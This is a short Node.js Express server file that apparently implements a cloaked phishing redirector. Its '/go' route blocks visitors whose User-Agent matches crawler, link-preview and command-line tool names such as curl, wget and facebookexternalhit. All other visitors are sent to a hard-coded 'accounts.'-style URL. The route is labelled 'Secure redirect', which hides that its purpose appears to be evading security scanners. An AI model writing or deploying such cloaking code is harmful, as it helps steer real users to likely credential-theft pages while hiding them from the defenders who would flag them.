const express = require("express");
const path = require("path");
const app = express();

// Serve static frontend
app.use(express.static("public"));

// Redirect URL (can also be set via env var)
const REAL_DEST = process.env.REDIRECT_URL || "https://accounts.qrataja.com/VnBxOUkT";

// Secure redirect
app.get("/go", (req, res) => {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const botPatterns = [
    "bot","crawl","spider","slurp","curl","wget",
    "python","httpclient","scrapy","facebookexternalhit"
  ];

  if (botPatterns.some(p => ua.includes(p))) {
    return res.status(403).send("Access Denied");
  }

  res.redirect(REAL_DEST);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
